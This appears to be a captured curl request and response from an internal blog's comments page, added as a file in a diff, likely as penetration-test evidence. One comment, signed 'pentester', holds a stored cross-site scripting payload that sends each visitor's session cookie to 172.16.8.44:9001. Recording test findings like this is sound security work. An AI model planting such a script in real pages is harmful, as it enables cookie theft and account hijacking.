@@ -1,0 +1,24 @@
+$ curl -s -i 'http://blog.acme.internal/post/58/comments'
+HTTP/1.1 200 OK
+Date: Wed, 17 Sep 2026 10:22:07 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1092
+Connection: close
+
+<!DOCTYPE html>
+<html>
+<head><title>Deploying to prod on a Friday - Comments</title></head>
+<body>
+  <h2>Comments (3)</h2>
+  <ul class="comments">
+    <li><b>jdoe</b>: Great write-up, thanks!</li>
+    <li><b>sam_h</b>: We hit the same issue last sprint.</li>
+    <li><b>pentester</b>: <script>new Image().src='http://172.16.8.44:9001/c?ck='+document.cookie;</script></li>
+  </ul>
+  <form action="/post/58/comments" method="post">
+    <textarea name="body"></textarea>
+    <button type="submit">Post comment</button>
+  </form>
+</body>
+</html>
